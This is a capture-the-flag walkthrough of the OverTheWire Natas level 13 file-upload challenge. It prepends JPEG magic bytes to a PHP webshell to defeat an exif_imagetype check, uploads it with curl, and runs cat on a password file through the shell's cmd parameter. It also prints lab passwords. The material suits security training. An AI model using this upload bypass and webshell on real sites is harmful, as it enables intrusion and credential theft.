# Natas Level 13

```bash
Username: natas13
Password: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
URL:      http://natas13.natas.labs.overthewire.org
```
We enter the site, and see the following page:
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas13.png" />
    <div align="center">Natas 13</div>
</figure>

Clicking on the "View sourcecode" link:
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas13-view-sourcecode.png" />
    <div align="center">Natas 13 - View sourcecode</div>
</figure>

Here the script is almost identical to the last one:
```php
function genRandomString() { 
    $length = 10; 
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz"; 
    $string = "";     

    for ($p = 0; $p < $length; $p++) { 
        $string .= $characters[mt_rand(0, strlen($characters)-1)]; 
    } 

    return $string; 
} 

function makeRandomPath($dir, $ext) { 
    do { 
        $path = $dir."/".genRandomString().".".$ext; 
    } while(file_exists($path)); 
    return $path; 
} 

function makeRandomPathFromFilename($dir, $fn) { 
    $ext = pathinfo($fn, PATHINFO_EXTENSION); 
    return makeRandomPath($dir, $ext); 
} 

if(array_key_exists("filename", $_POST)) { 
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]); 
     
    $err=$_FILES['uploadedfile']['error']; 
    if($err){ 
        if($err === 2){ 
            echo "The uploaded file exceeds MAX_FILE_SIZE"; 
        } else{ 
            echo "Something went wrong :/"; 
        } 
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) { 
        echo "File is too big"; 
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) { 
        echo "File is not an image"; 
    } else { 
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { 
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded"; 
        } else{ 
            echo "There was an error uploading the file, please try again!"; 
        } 
    }
```
When trying to upload the PHP-webshell (from level 12), we get the following:


```bash
curl -u natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY --form uploadedfile=@PHP-webshell.php --form filename=shell.php http://natas13.natas.labs.overthewire.org

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas13", "pass": "jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY" };</script></head>
<body>
<h1>natas13</h1>
<div id="content">
For security reasons, we now only accept image files!<br/><br/>

File is not an image<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```
We can see that the filename hidden value have .jpg extension, so we need to change it to .php, lets use cURL again:

```bash
curl -u natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 --form uploadedfile=@PHP-webshell.php --form filename=shell.php http://natas12.natas.labs.overthewire.org
```

except the one additional check (*[exit_imagetype](http://php.net/manual/en/function.exif-imagetype.php)*), according to the man page:
<pre><span class="function"><strong>exif_imagetype()</strong></span> reads the first bytes of an image and checks its signature.
When a correct signature is found, the appropriate constant value will be returned otherwise the return value is <strong><code>FALSE</code></strong>.</pre>

We just need to add jpg [magic bytes](https://en.wikipedia.org/wiki/List_of_file_signatures) (FF D8 FF DB) to the beggining of the file:
```bash
www@Roee-Ubuntu:~$ file PHP-webshell.php 
PHP-webshell.php: PHP script, ASCII text
www@Roee-Ubuntu:~$ printf "\xFF\xD8\xFF\xDB" | cat - PHP-webshell.php > PHP-webshell-jpg.php 
www@Roee-Ubuntu:~$ file PHP-webshell-jpg.php 
PHP-webshell-jpg.php: JPEG image data
```

Lets try to upload this webshell:
```bash
curl -u natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY --form uploadedfile=@PHP-webshell-jpg.php --form filename=shell.php http://natas13.natas.labs.overthewire.org
```

The result is:
```bash
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas13", "pass": "jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY" };</script></head>
<body>
<h1>natas13</h1>
<div id="content">
For security reasons, we now only accept image files!<br/><br/>

The file <a href="upload/vevsok4ez0.php">upload/vevsok4ez0.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Nice, now similar to the last level, lets inject the [command](http://natas13.natas.labs.overthewire.org/upload/vevsok4ez0.php?cmd=cat%20/etc/natas_webpass/natas14):
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas13-webshell.png" />
    <div align="center">Natas 13 - Webshell</div>
</figure>

We got the password for the next level: **Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1**